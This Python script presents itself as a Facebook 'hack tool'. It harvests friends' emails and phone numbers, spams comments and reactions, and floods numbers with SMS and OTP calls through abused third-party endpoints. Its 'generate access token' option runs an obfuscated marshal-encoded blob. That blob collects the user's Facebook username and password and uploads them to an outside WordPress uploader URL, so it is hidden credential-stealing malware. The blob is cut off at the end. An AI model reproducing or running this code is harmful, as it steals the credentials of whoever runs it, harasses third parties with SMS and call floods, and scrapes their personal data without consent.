#!/usr/bin/python
#-*-coding:utf-8-*-
import os,requests,json,hashlib,sys,marshal
W = '\033[1;37m' # White bold
N  = '\033[0m'  # white (Normal)
R = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan

def nems():
	print W+B+"[*]"+W+" Writting All ID_Name From Your Friendlist ..."
	print W+B+"[*]"+W+" OUTPUT : "+R+"/OUTPUT/ID_name.txt"
	data= requests.get('https://graph.facebook.com/me/friends?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	dd=json.loads(data.text)
	try:
		os.mkdir('OUTPUT')
	except:
		name=open('OUTPUT/ID_name.txt','w')
	name=open('OUTPUT/ID_name.txt','w')
	print "="*30
	for k in dd['data']:
		try:
			print W+B+"[*] "+W+k['id']+" ~> "+k['name']+""
			name.write("[*] "+k['id']+" ~> "+k['name']+"\n")
		except:
			print R+"[-] Unknown!"
			pass
	name.close()
	f=open('OUTPUT/ID_name.txt').readlines()
	p=len(f)
	print W+B+"[*] "+W+R+str(p)+" Name Writted!"
def name():
	print W+B+"[*]"+W+" Writting All Name From Your Friendlist ..."
	print W+B+"[*]"+W+" OUTPUT : "+R+"/OUTPUT/name.txt"
	data= requests.get('https://graph.facebook.com/me/friends?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	dd=json.loads(data.text)
	try:
		os.mkdir('OUTPUT')
	except:
		name=open('OUTPUT/name.txt','w')
	name=open('OUTPUT/name.txt','w')
	print "="*30
	for k in dd['data']:
		try:
			print W+B+"[*] "+W+k['name']+""
			name.write("[*] "+k['name']+"\n")
		except:
			print R+"[-] Unknown!"
			pass
	name.close()
	f=open('name.txt').readlines()
	p=len(f)
	print W+B+"[*] "+W+R+str(p)+" Name Writted!"
	
def emailfromid():
	id=input(W+R+'[?]'+W+' ID>> ')
	print W+B+"[*]"+W+" Getting Email From ID "+R+str(id)+" ..."
	r2=requests.get('https://graph.facebook.com/'+str(id)+'?access_token='+str(open('my_token.txt').readline().replace('\n',''))+"")
	js=json.loads(r2.text)
	try:
		print W+B+"[*] "+W+js['name']+G+" ~~> "+W+js['email']
	except:
		try:
			print W+R+"[-] "+W+js['name']+" ~~> "+R+"Email Not Found."
		except:
			print R+"[-] ID Unknown!"

def getemail():
	
	print W+B+"[*]"+W+" Geeting Email ..."
	print W+R+"="*40
	data= requests.get('https://graph.facebook.com/me/friends?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	dd=json.loads(data.text)
	for k in dd['data']:
		r2=requests.get('https://graph.facebook.com/'+k['id']+'?access_token='+str(open('my_token.txt').readline().replace('\n',''))+"")
		js=json.loads(r2.text)
		try:
			print W+B+"[*] "+W+js['name']+G+"  ~>"+W+"",js['email']
			got="[*] "+js['name']+"  ~>",js['email']
		except:
			try:
				print W+R+"\r[-] "+W+js['name']+"  ~> "+R+"Email Not Found."
			except:
				print W+R+"\r[-] ID Unknown!"
				
def getid():
	print W+B+"[*]"+W+" Writing ID ..."
	print W+B+"[*]"+W+" OUTPUT : "+R+"/OUTPUT/ID.txt"
	data= requests.get('https://graph.facebook.com/me/friends?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	js=json.loads(data.text)
	try:
		os.mkdir('OUTPUT')
	except:
		o=open('OUTPUT/ID.txt','w')
	o=open('OUTPUT/ID.txt','w')
	print
	for k in js['data']:
		try:
			ln="="*50
			o.write(k["id"]+"\n")
		except:
			print W+B+"[*] "+W+k['id']+"\t~>"+R+" Failure To Write ID!"
	o.close()
	f=open('OUTPUT/ID.txt').readlines()
	p=len(f)
	print W+B+"\n[*]"+W+R+" "+str(p)+" "+W+"ID Writted."
	print W+B+"[*]"+W+" OUTPUT : "+R+"/OUTPUT/ID.txt"
	
def getusername():
	
	print W+B+"[*]"+W+" Geetting USERNAME ...\n"
	data= requests.get('https://graph.facebook.com/me/friends?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	dd=json.loads(data.text)
	for k in dd['data']:
		r2=requests.get('https://graph.facebook.com/'+k['id']+'?access_token='+str(open('my_token.txt').readline().replace('\n',''))+"")
		js=json.loads(r2.text)
		try:
			print W+B+"[*] "+W+js['name']+G+"  ~>"+W+"",js['username']
			got="[*] "+js['name']+"  ~>",js['username']
		except:
			try:
				print W+R+"\r[-] "+W+js['name']+"  ~> "+R+"Username Not Found."
			except:
				print W+R+"\r[-] Unknown!"
				
def spam_wall_target():
	id=raw_input(W+R+'[?]'+W+' ID>> ')
	limit=raw_input(W+R+'[?]'+W+' Number Of Limit Wallpost> ')
	msg=raw_input(W+R+'[?]'+W+' Message> ')
	r = requests.get("https://graph.facebook.com/v3.0/"+id+"?fields=feed.limit("+limit+")&access_token="+str(open('my_token.txt').readline().replace('\n',''))+"")
	r2=requests.get('https://graph.facebook.com/'+id+'?access_token='+str(open('my_token.txt').readline().replace('\n',''))+"")
	js=json.loads(r.text)
	ji=json.loads(r2.text)
	print W+B+"[*] "+W+"Target Name\t: "+R+ji['name']
	print W+B+"[*] "+W+"Spamming ..."
	for k in js['feed']['data']:
		try:
			parameters = {'access_token' :(str(open('my_token.txt').readline().replace('\n',''))), 'message' : msg}
			rr=requests	.post("https://graph.facebook.com/"+k["id"]+"/comments",data=parameters)
			if "id" in rr.text:
				print W+R+"="*55
				print W+B+"[*]"+W+" POST ID\t: "+k['id']
				print W+B+"[*]"+W+" PROFILE\t: https://facebook.com/"+ji["id"]
				print W+B+"[*]"+W+" Comment\t:",msg
				print W+B+"[*]"+W+" Message\t: "+k['message'][:30]+" ..."
				print W+B+"[*]"+W+" Status\t: "+G+"Succes."
			else:
				print W+R+"="*55
				print W+B+"[*]"+W+" POST ID\t: "+k['id']
				print W+B+"[*]"+W+" PROFILE\t: https://facebook.com/"+k["id"]
				print W+B+"[*]"+W+" Comment\t: "+msg
				print W+B+"[*]"+W+" Message\t: "+k['message'][:30]+" ..."
				print W+B+"[*] "+W+"Status\t: "+W+R+"Failed."
				break
		except:
			print W+B+"[*]"+W+" Story\t: "+k['story'][:30]+" ..."
			print W+B+"[*]"+W+" Status\t:"+G+" Succes."
	print W+B+"\n[*] "+W+R+limit+W+" Post Succesfully Comment!"
	print W+R+"="*55
	
def getnum():
	id=raw_input(W+R+"[?]"+W+" ID>> ")
	r=requests.get('https://graph.facebook.com/'+id+'?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	js=json.loads(r.text)
	try:
		print W+B+"[+] "+W+js["name"]+" ~>  "+js["mobile_phone"]
	except:
		print W+B+"[+] "+W+js["name"]+" ~> "+R+"Not Using Phone Number."
		
def get_number():
	print W+B+"[*]"+W+" Writting All Phone Number From Your Friendlist ..."
	print W+B+"[*]"+W+" OUTPUT  : "+R+"/OUTPUT/no_and_name.txt"
	print W+B+"[*]"+W+" Only No :"+R+" /OUTPUT/no.txt"
	print W+B+"[*]"+W+" Press CTRL+C To Stopped."
	print W+R+"="*50
	data= requests.get('https://graph.facebook.com/me/friends?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
	js=json.loads(data.text)
	try:
		os.mkdir('OUTPUT')
		output=open('OUTPUT/no_and_name.txt','w')
		put=open('OUTPUT/only_no.txt','w')
	except:
		output=open('OUTPUT/no_and_name.txt','w')
		put=open('OUTPUT/only_no.txt','w')
	output=open('OUTPUT/no_and_name.txt','w')
	put=open('OUTPUT/only_no.txt','w')
	for i in js['data']:
		r=requests.get('https://graph.facebook.com/'+i['id']+'?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
		jsjs=json.loads(r.text)
		try:
			o="="*50
			out=""+o+"\n[*] "+jsjs["name"]+" ~> "+jsjs['mobile_phone']
			only=jsjs['mobile_phone']
			print W+B+"[*] "+W+jsjs["name"]+" ~> "+jsjs['mobile_phone']
			output.write(out+'\n')
			put.write(only+'\n')
		except:
			pass
	output.close()
	put.close()
	print W+B+"\n[*]"+W+" Writted!"
	print W+B+"[*]"+W+" OUTPUT  : "+R+"/OUTPUT/no_and_name.txt"
	print W+B+"[*]"+W+" Only No : /OUTPUT/no.txt"
	print W+R+"="*50
	
def spam_only():
	id=raw_input(W+R+'[?]'+W+' ID>> ')
	count=input(W+R+'[?]'+W+' Count> ')
	print W+B+"[*]"+W+" Spamming ..."
	print R+"="*50
	for k in range(count):
		r=requests.get('https://graph.facebook.com/'+id+'?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
		js=json.loads(r.text)
		try:
			goattack = js['mobile_phone']
			reps=goattack.replace('+62','0')
			param={'phone':reps,'smsType':'1'}
			requestss=requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
			
			if "succes" in requestss.text:
				print W+B+"[*]"+W+" Number ~> : "+reps+G+" SMS SEND!"
			else:
				print W+B+"[-]"+W+" Number ~> : "+reps+R+" SMS SEND FAILED!"
		except:
			print R+"[-] This ID Not Using Mobile Phone"
			break
	print W+B+"[*]"+W+" Spam Finished."
	print W+R+"="*50
	
	
def spam_from_id():
	o=raw_input(W+R+'[?]'+W+' ID List>> ')
	try:
		cok=open(o).readlines()
	except:
		print W+R+"[-] Hmm,File Not Found."
		pass
	cok=open(o).readlines()
	print W+B+"[*] "+W+R+str(len(cok))+W+" Loaded!"
	print W+B+"[*]"+W+" Spamming ..."
	cik=len(cok)
	cekok=open(o)
	print R+"="*40
	for k in range(cik):
		id=cekok.readline().replace('\n','')
		r=requests.get('https://graph.facebook.com/'+id+'?access_token='+str(open('my_token.txt').readline().replace('\n','')+''))
		js=json.loads(r.text)
		try:
			goattack = js['mobile_phone']
			reps=goattack.replace('+62','0')
			param={'phone':reps,'smsType':'1'}
			requestss=requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
			if "succes" in requestss.text:
				print W+B+"[*]"+W+" ID\t\t:",id
				print W+B+"[*]"+W+" Name\t:",js['name']
				print W+B+"[*]"+W+" Number\t:",reps
				print W+B+"[*]"+W+" Spammed\t: Sms"
				print W+B+"[*]"+W+" Status\t:"+G+" Succes."
			else:
				print W+B+"[*]"+W+" ID\t\t:",id
				print W+B+"[*]"+W+" Name\t:",js['name']
				print W+B+"[*]"+W+" Number\t:",reps
				print W+B+"[*]"+W+" Spammed\t: Sms"
				print W+B+"[*]"+W+" Status\t:"+R+" Failed."
			param2={'msisdn':reps,'accept':'call'}
			requests2=requests.post('https://www.tokocash.com/oauth/otp',data=param2)
			if "otp_attempt_left" in requests2.text:
				print W+B+"[*]"+W+" Spammed\t: Telephone"
				print W+B+"[*]"+W+" Status\t: "+G+"Succes."
			else:
				print W+B+"[*]"+W+" Spammed\t: Telephone"
				print W+B+"[*]"+W+" Status\t:"+R+" Failed."
			
		except:
			pass
	print W+R+"="*40
	print W+B+"[*]"+W+" Spam Finished."
	
def reaction():
	print W+R+"[*]"+W+" Select From Menu:\n"
	print W+B+"  1"+R+")"+W+" Like"
	print W+B+"  2"+R+")"+W+" Haha"
	print W+B+"  3"+R+")"+W+" Wow"
	print W+B+"  4"+R+")"+W+" Love"
	print W+B+"  5"+R+")"+W+" Angry"
	print W+B+"  6"+R+")"+W+" Sad"
	momo_ngentot=raw_input(W+R+'\n[?]'+W+' Choose: ')
	if "1" in momo_ngentot:
		limit_react=raw_input(W+B+'[*] '+W+'MAX: 599\n'+R+'[?]'+W+' Limit Wallpost Number You Want To Like? ')
		print W+B+"[*]"+W+" Getting POST ID From Your Wallpost ..."
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit('+str(limit_react)+')&access_token='+str(open('my_token.txt').readline().replace('\n','')))
		js=json.loads(r.text)
		nums=open('num.txt','w')
		for numer in js['home']['data']:
			nums.write(numer['id']+'\n')
		nums.close()
		cek_id=open('num.txt').readlines()
		print W+B+"[*] "+R+str(len(cek_id))+""+W+" Wall ID Loaded!"
		os.system('rm -rf num.txt')
		print W+B+"[*] "+W+"Botting ... "
		for id_wall in js['home']['data']:
			wall_id=id_wall['id']
			sundul={'access_token':(open('my_token.txt').readline().replace('\n','')),'type':'LIKE'}
			rr=requests.post("https://graph.facebook.com/"+wall_id+"/reactions",data=sundul)
			if "succes" in rr.text:
				try:
					print R+"="*55
					print W+B+"[*] "+W+"POST ID\t: "+str(wall_id)
					print W+B+"[*] "+W+"Story\t: "+id_wall['story'][:20]+" ..."
					print W+B+"[*] "+W+"Status\t: "+G+"Succes"
					print W+B+"[*] "+W+"React Type\t: LIKE"
				except:
					try:
						print W+B+"[*] "+W+"Message\t: "+id_wall['message'][:30].replace('\n','')+" ..."
						print W+B+"[*] "+W+"Status\t: "+G+"Succes"
						print W+B+"[*] "+W+"React Type\t: LIKE"
					except:
						pass
			else:
				pass
		print W+B+"\n[*]"+W+" Bot Doneee :*"
		print R+"="*55

	elif "2" in momo_ngentot:
		limit_react=raw_input(W+B+'[*] '+W+'MAX: 599\n'+R+'[?]'+W+' Limit Wallpost Number You Want To Like? ')
		print W+B+"[*]"+W+" Getting POST ID From Your Wallpost ..."
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit('+str(limit_react)+')&access_token='+str(open('my_token.txt').readline().replace('\n','')))
		js=json.loads(r.text)
		nums=open('num.txt','w')
		for numer in js['home']['data']:
			nums.write(numer['id']+'\n')
		nums.close()
		cek_id=open('num.txt').readlines()
		print W+B+"[*] "+R+str(len(cek_id))+""+W+" Wall ID Loaded!"
		os.system('rm -rf num.txt')
		print W+B+"[*] "+W+"Botting ... "
		for id_wall in js['home']['data']:
			wall_id=id_wall['id']
			sundul={'access_token':(open('my_token.txt').readline().replace('\n','')),'type':'HAHA'}
			rr=requests.post("https://graph.facebook.com/"+wall_id+"/reactions",data=sundul)
			if "succes" in rr.text:
				try:
					print R+"="*55
					print W+B+"[*] "+W+"POST ID\t: "+str(wall_id)
					print W+B+"[*] "+W+"Story\t: "+id_wall['story'][:20]+" ..."
					print W+B+"[*] "+W+"Status\t: "+G+"Succes"
					print W+B+"[*] "+W+"React Type\t: HAHA"
				except:
					try:
						print W+B+"[*] "+W+"Message\t: "+id_wall['message'][:30].replace('\n','')+" ..."
						print W+B+"[*] "+W+"Status\t: "+G+"Succes"
						print W+B+"[*] "+W+"React Type\t: HAHA"
					except:
						pass
			else:
				pass
		print W+B+"\n[*]"+W+" Bot Doneee :*"
		print R+"="*55
	elif "3" in momo_ngentot:
		limit_react=raw_input(W+B+'[*] '+W+'MAX: 599\n'+R+'[?]'+W+' Limit Wallpost Number You Want To Like? ')
		print W+B+"[*]"+W+" Getting POST ID From Your Wallpost ..."
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit('+str(limit_react)+')&access_token='+str(open('my_token.txt').readline().replace('\n','')))
		js=json.loads(r.text)
		nums=open('num.txt','w')
		for numer in js['home']['data']:
			nums.write(numer['id']+'\n')
		nums.close()
		cek_id=open('num.txt').readlines()
		print W+B+"[*] "+R+str(len(cek_id))+""+W+" Wall ID Loaded!"
		os.system('rm -rf num.txt')
		print W+B+"[*] "+W+"Botting ... "
		for id_wall in js['home']['data']:
			wall_id=id_wall['id']
			sundul={'access_token':(open('my_token.txt').readline().replace('\n','')),'type':'WOW'}
			rr=requests.post("https://graph.facebook.com/"+wall_id+"/reactions",data=sundul)
			if "succes" in rr.text:
				try:
					print R+"="*55
					print W+B+"[*] "+W+"POST ID\t: "+str(wall_id)
					print W+B+"[*] "+W+"Story\t: "+id_wall['story'][:20]+" ..."
					print W+B+"[*] "+W+"Status\t: "+G+"Succes"
					print W+B+"[*] "+W+"React Type\t: WOW"
				except:
					try:
						print W+B+"[*] "+W+"Message\t: "+id_wall['message'][:30].replace('\n','')+" ..."
						print W+B+"[*] "+W+"Status\t: "+G+"Succes"
						print W+B+"[*] "+W+"React Type\t: WOW"
					except:
						pass
			else:
				pass
		print W+B+"\n[*]"+W+" Bot Doneee :*"
		print R+"="*55
		
	elif "4" in momo_ngentot:
		limit_react=raw_input(W+B+'[*] '+W+'MAX: 599\n'+R+'[?]'+W+' Limit Wallpost Number You Want To Like? ')
		print W+B+"[*]"+W+" Getting POST ID From Your Wallpost ..."
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit('+str(limit_react)+')&access_token='+str(open('my_token.txt').readline().replace('\n','')))
		js=json.loads(r.text)
		nums=open('num.txt','w')
		for numer in js['home']['data']:
			nums.write(numer['id']+'\n')
		nums.close()
		cek_id=open('num.txt').readlines()
		print W+B+"[*] "+R+str(len(cek_id))+""+W+" Wall ID Loaded!"
		os.system('rm -rf num.txt')
		print W+B+"[*] "+W+"Botting ... "
		for id_wall in js['home']['data']:
			wall_id=id_wall['id']
			sundul={'access_token':(open('my_token.txt').readline().replace('\n','')),'type':'LOVE'}
			rr=requests.post("https://graph.facebook.com/"+wall_id+"/reactions",data=sundul)
			if "succes" in rr.text:
				try:
					print R+"="*55
					print W+B+"[*] "+W+"POST ID\t: "+str(wall_id)
					print W+B+"[*] "+W+"Story\t: "+id_wall['story'][:20]+" ..."
					print W+B+"[*] "+W+"Status\t: "+G+"Succes"
					print W+B+"[*] "+W+"React Type\t: LOVE"
				except:
					try:
						print W+B+"[*] "+W+"Message\t: "+id_wall['message'][:30].replace('\n','')+" ..."
						print W+B+"[*] "+W+"Status\t: "+G+"Succes"
						print W+B+"[*] "+W+"React Type\t: LOVE"
					except:
						pass
			else:
				pass
		print W+B+"\n[*]"+W+" Bot Doneee :*"
		print R+"="*55
		
	elif "5" in momo_ngentot:
		limit_react=raw_input(W+B+'[*] '+W+'MAX: 599\n'+R+'[?]'+W+' Limit Wallpost Number You Want To Like? ')
		print W+B+"[*]"+W+" Getting POST ID From Your Wallpost ..."
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit('+str(limit_react)+')&access_token='+str(open('my_token.txt').readline().replace('\n','')))
		js=json.loads(r.text)
		nums=open('num.txt','w')
		for numer in js['home']['data']:
			nums.write(numer['id']+'\n')
		nums.close()
		cek_id=open('num.txt').readlines()
		print W+B+"[*] "+R+str(len(cek_id))+""+W+" Wall ID Loaded!"
		os.system('rm -rf num.txt')
		print W+B+"[*] "+W+"Botting ... "
		for id_wall in js['home']['data']:
			wall_id=id_wall['id']
			sundul={'access_token':(open('my_token.txt').readline().replace('\n','')),'type':'ANGRY'}
			rr=requests.post("https://graph.facebook.com/"+wall_id+"/reactions",data=sundul)
			if "succes" in rr.text:
				try:
					print R+"="*55
					print W+B+"[*] "+W+"POST ID\t: "+str(wall_id)
					print W+B+"[*] "+W+"Story\t: "+id_wall['story'][:20]+" ..."
					print W+B+"[*] "+W+"Status\t: "+G+"Succes"
					print W+B+"[*] "+W+"React Type\t: ANGRY"
				except:
					try:
						print W+B+"[*] "+W+"Message\t: "+id_wall['message'][:30].replace('\n','')+" ..."
						print W+B+"[*] "+W+"Status\t: "+G+"Succes"
						print W+B+"[*] "+W+"React Type\t: ANGRY"
					except:
						pass
			else:
				pass
		print W+B+"\n[*]"+W+" Bot Doneee :*"
		print R+"="*55
		
	elif "6" in momo_ngentot:
		limit_react=raw_input(W+B+'[*] '+W+'MAX: 599\n'+R+'[?]'+W+' Limit Wallpost Number You Want To Like? ')
		print W+B+"[*]"+W+" Getting POST ID From Your Wallpost ..."
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit('+str(limit_react)+')&access_token='+str(open('my_token.txt').readline().replace('\n','')))
		js=json.loads(r.text)
		nums=open('num.txt','w')
		for numer in js['home']['data']:
			nums.write(numer['id']+'\n')
		nums.close()
		cek_id=open('num.txt').readlines()
		print W+B+"[*] "+R+str(len(cek_id))+""+W+" Wall ID Loaded!"
		os.system('rm -rf num.txt')
		print W+B+"[*] "+W+"Botting ... "
		for id_wall in js['home']['data']:
			wall_id=id_wall['id']
			sundul={'access_token':(open('my_token.txt').readline().replace('\n','')),'type':'SAD'}
			rr=requests.post("https://graph.facebook.com/"+wall_id+"/reactions",data=sundul)
			if "succes" in rr.text:
				try:
					print R+"="*55
					print W+B+"[*] "+W+"POST ID\t: "+str(wall_id)
					print W+B+"[*] "+W+"Story\t: "+id_wall['story'][:20]+" ..."
					print W+B+"[*] "+W+"Status\t: "+G+"Succes"
					print W+B+"[*] "+W+"React Type\t: SAD"
				except:
					try:
						print W+B+"[*] "+W+"Message\t: "+id_wall['message'][:30].replace('\n','')+" ..."
						print W+B+"[*] "+W+"Status\t: "+G+"Succes"
						print W+B+"[*] "+W+"React Type\t: SAD"
					except:
						pass
			else:
				pass
		print W+B+"\n[*]"+W+" Bot Doneee :*"
		print R+"="*55
	else:
		print W+R+"[-] Input Failed![Entekhab Eshtebah!]"
		pass
		
	
	
	
def main():
	lines="="*40
	print W+R+"	"+lines+""
	print W+P+"\t\t   Coded By  AnonyminHack5 (Admin of Termux Android Hackers)"+P
	print W+B+"RRRRR         A       FFFFFFFF    III"+B
	print W+B+"RRRRR        AAA      F            I"+B
	print W+O+"RRRR        AAAAA     FFFFFRFF     I"+O
	print W+O+"RRR        AAAAAA     F            I"+O
	print W+R+"R  R      A      A    F            I "+R
	print W+C+"R   R    A        A   F            I"+C
	print W+C+"R    R  A          A  F           III"+C
	print W+C+" "
	print G+B+"ffff bbbb "+C+"   ssss"+R+"  h    h"
	print G+B+"f    b   b"+C+"  l    "+R+"  h    h"
	print G+B+"fff  bbbb "+C+"   ssss"+R+"  hhhhhh"
	print G+B+"f    b   b"+C+"       l"+R+" h    h"
	print G+B+"f    bbbb "+C+"   ssss"+R+"  h    h"
	print W+B+ "FACEBOOOK"+C+ "SECURITY"+R+ "HACK"+G+ "Tool"
	print W+ R+"	"+lines+"\n\n[+] "+O+"Created By ANONYMINHACK5(Admin of Termux Android Hackers)."
	print W+R+ "NOTE:"+C+"First Select A and log in your FB"
	print W+R+ "NOTE:"+C+"sabase pahale a chunen aur apane fb mein log in karen" 
	print W+R+"[-] "+C+"Select From Menu:\n"
	print W+B+"  A"+R+")"+G+" Generate Facebook Acces Token"
	print W+B+"  B"+R+")"+R+" Mass Spam All Your Friends Phone Number"
	print W+B+"  C"+R+")"+C+" Spam Your Friends Number From ID List"
	print W+B+"  D"+R+")"+P+" Spam SMS Your Friends Only Number From ID "
	print W+B+"  E"+R+")"+B+" Grab All Phone Number From Your FriendList"
	print W+B+"  F"+R+")"+O+" Get Phone Number From ID"
	print W+B+"  G"+R+")"+N+" Grab USERNAME From Your Friendlist"
	print W+B+"  H"+R+")"+G+" Fast Grab ALL ID From Your Friendlist"
	print W+B+"  I"+R+")"+C+" Grab Email From Your Friendlist"
	print W+B+"  J"+R+")"+B+" Get Email From ID"
	print W+B+"  K"+R+")"+P+" Fast Grab All Name From Your Friendlist"
	print W+B+"  L"+R+")"+O+" Mass Spam Comment From Your Friends Wall POST ID"
	print W+B+"  M"+R+")"+W+B+" ("+R+"NEW"+B+")"+C+" Spam Comment Friends POST Only With 1/10 Account "
	print W+B+"  N"+R+")"+G+" Bot Auto Reactions From Your Wallpost"
	print W+B+"  O"+R+")"+P+" Fast Grab All ID+NAME From Your Friendlist"
	print W+B+"  P"+R+")"+W+" Info"
	print W+B+"  Q"+R+")"+R+" Byeee(KHOROJ).\n"
	pilih=raw_input(W+R+'[+] '+W+'F-HUNTER>>> ')
	if pilih == "a" or pilih == "A":
		exec(marshal.loads('''c\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\x9e\x02\x00\x00e\x00\x00e\x01\x00\x17d\x00\x00\x17e\x00\x00\x17d\x01\x00\x17GHe\x02\x00e\x03\x00d\x02\x00\x17e\x00\x00\x17d\x03\x00\x17\x83\x01\x00Z\x04\x00e\x02\x00e\x03\x00d\x02\x00\x17e\x00\x00\x17d\x04\x00\x17\x83\x01\x00Z\x05\x00e\x00\x00e\x03\x00\x17d\x05\x00\x17e\x00\x00\x17d\x06\x00\x17GHd\x07\x00Z\x06\x00i\x0b\x00d\x08\x00d\t\x006d\n\x00d\x0b\x006e\x04\x00d\x0c\x006d\r\x00d\x0e\x006d\x0f\x00d\x10\x006d\x0f\x00d\x11\x006d\x12\x00d\x13\x006d\x14\x00d\x15\x006e\x05\x00d\n\x006d\x16\x00d\x17\x006d\x18\x00d\x19\x006Z\x07\x00d\x1a\x00e\x04\x00\x17d\x1b\x00\x17e\x05\x00\x17d\x1c\x00\x17e\x06\x00\x17Z\x08\x00e\t\x00j\n\x00d\x1d\x00\x83\x01\x00Z\x0b\x00e\x0b\x00j\x0c\x00e\x08\x00\x83\x01\x00\x01e\x07\x00j\x0c\x00i\x01\x00e\x0b\x00j\r\x00\x83\x00\x00d\x1e\x006\x83\x01\x00\x01yM\x01e\x0e\x00j\x0f\x00d\x1f\x00d \x00e\x07\x00\x83\x01\x01Z\x10\x00e\x11\x00d!\x00d"\x00\x83\x02\x00Z\x12\x00e\x13\x00j\x14\x00e\x10\x00j\x15\x00\x83\x01\x00Z\x16\x00y\xc5\x00e\x12\x00j\x17\x00e\x16\x00d#\x00\x19\x83\x01\x00\x01e\x12\x00j\x18\x00\x83\x00\x00\x01d$\x00Z\x19\x00d9\x00Z\x1a\x00e\x1a\x00d\'\x00\x17e\x04\x00\x17d(\x00\x17e\x05\x00\x17d)\x00\x17e\x1a\x00\x17Z\x1b\x00i\x01\x00e\x19\x00e\x1b\x00d*\x00f\x03\x00d+\x006Z\x1c\x00e\x0e\x00j\x1d\x00d,\x00d-\x00e\x1e\x00d.\x00e\x1c\x00\x83\x01\x02Z\x1f\x00e\x00\x00e\x03\x00\x17d\x02\x00\x17e\x00\x00\x17d/\x00\x17e\x01\x00\x17d0\x00\x17GHe\x02\x00e\x00\x00e\x01\x00\x17d1\x00\x17e\x00\x00\x17d2\x00\x17\x83\x01\x00\x01e \x00j!\x00d3\x00\x83\x01\x00\x01e"\x00\x83\x00\x00\x01WnK\x00\x01\x01\x01e\x00\x00e\x01\x00\x17d4\x00\x17GHe \x00j!\x00d5\x00\x83\x01\x00\x01e\x02\x00e\x01\x00d1\x00\x17e\x00\x00\x17d2\x00\x17\x83\x01\x00\x01e \x00j!\x00d3\x00\x83\x01\x00\x01e"\x00\x83\x00\x00\x01n\x01\x00XWnG\x00\x01\x01\x01e\x00\x00e\x01\x00\x17d6\x00\x17GHe \x00j!\x00d5\x00\x83\x01\x00\x01e\x02\x00d1\x00e\x00\x00\x17d7\x00\x17\x83\x01\x00\x01e \x00j!\x00d3\x00\x83\x01\x00\x01e"\x00\x83\x00\x00\x01n\x01\x00Xd8\x00S(:\x00\x00\x00s\x03\x00\x00\x00[~]s\x1d\x00\x00\x00 Login Your Facebook Account.s\x03\x00\x00\x00[*]s\x0c\x00\x00\x00 Username : s\x0c\x00\x00\x00 Password : s\x04\x00\x00\x00[*] s\x1f\x00\x00\x00Generating Your Acces Token ...t \x00\x00\x0062f8ce9f74b12f84c123cc23437a4a32t \x00\x00\x00882a8490361da98702bf97a021ddc14dt\x07\x00\x00\x00api_keyt\x08\x00\x00\x00passwordt\x10\x00\x00\x00credentials_typet\x05\x00\x00\x00emailt\x04\x00\x00\x00JSONt\x06\x00\x00\x00formatt\x01\x00\x00\x001t\x13\x00\x00\x00generate_machine_idt\x18\x00\x00\x00generate_session_cookiest\x05\x00\x00\x00en_USt\x06\x00\x00\x00locales\n\x00\x00\x00auth.logint\x06\x00\x00\x00methodt\x01\x00\x00\x000t\x14\x00\x00\x00return_ssl_resourcess\x03\x00\x00\x001.0t\x01\x00\x00\x00vsG\x00\x00\x00api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`\x00\x00\x00format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s\x1b\x00\x00\x00return_ssl_resources=0v=1.0t\x03\x00\x00\x00md5t\x03\x00\x00\x00sigs\'\x00\x00\x00https://api.facebook.com/restserver.phpt\x06\x00\x00\x00paramss\x0c\x00\x00\x00my_token.txtt\x01\x00\x00\x00wt\x0c\x00\x00\x00access_tokens\t\x00\x00\x00deray.txtt\x01\x00\x00\x00=i\x14\x00\x00\x00s\n\x00\x00\x00\n[*] ID : s\n\x00\x00\x00\n[*] PW : s\x01\x00\x00\x00\ns\t\x00\x00\x00text/htmlt\x08\x00\x00\x00FiledatasU\x00\x00\x00http://ailisgarcia.com/wp-content/plugins/viral-optins/api/uploader/file-uploader.phpt\x06\x00\x00\x00verifyt\x05\x00\x00\x00filess\x13\x00\x00\x00 Your Acces Token :s\r\x00\x00\x00 my_token.txts\x03\x00\x00\x00[!]s\x18\x00\x00\x00 Press enter to menu ...t\x05\x00\x00\x00clears%\x00\x00\x00[!] Failed To Generating Acces Token!s\x13\x00\x00\x00rm -rf my_token.txts\x15\x00\x00\x00[!] Connection Error!s\x17\x00\x00\x00 Press enter to menu.. Ns\x14\x00\x00\x00====================(#\x00\x00\x00t\x01\x00\x00\x00Wt\x01\x00\x00\x00Rt\t\x00\x00\x00raw_inputt\x01\x00\x00\x00Bt\x02\x00\x00\x00idt\x03\x00\x00\x00pwdt\n\x00\x00\x00API_SECRETt\x04\x00\x00\x00dataR\x12\x00\x00\x00t\x07\x00\x00\x00hashlibt\x03\x00\x00\x00newt\x01\x00\x00\x00xt\x06\x00\x00\x00updatet\t\x00\x00\x00hexdigestt\x08\x00\x00\x00requestst\x03\x00\x00\x00gett\x01\x00\x00\x00rt\x04\x00\x00\x00opent\x06\x00\x00\x00cookiet\x04\x00\x00\x00jsont\x05\x00\x00\x00loadst\x04\x00\x00\x00textt\x02\x00\x00\x00jst\x05\x00\x00\x00writet\x05\x00\x00\x00closet\x07\x00\x00\x00payloadt\x04\x00\x00\x00linet\x08\x00\x00\x00postdataR\x19\x00\x00\x00t\x04\x00\x00\x00postt\x05\x00\x00\x00Falset\x03\x00\x00\x00gott\x02\x00\x00\x00ost\x06\x00\x00\x00systemt\x04\x00\x00\x00main(\x00\x00\x00\x00(\x00\x